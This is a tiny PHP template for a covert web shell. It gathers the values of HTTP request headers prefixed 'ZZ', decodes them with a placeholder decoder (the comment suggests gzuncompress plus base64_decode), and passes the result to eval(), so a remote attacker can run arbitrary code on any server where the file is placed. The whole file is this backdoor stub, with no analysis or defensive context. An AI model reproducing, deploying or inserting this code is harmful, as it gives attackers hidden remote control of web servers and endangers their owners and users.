<?

// %s is auto replaced by DECODER($x) [ ex: %s -> gzuncompress(base64_decode($x)) ]
$s=$_SERVER;ksort($s);$x="";foreach($s as $a=>$b)if(substr($a,0,7)=='HTTP_ZZ')$x.=$b;eval(%s);

?>
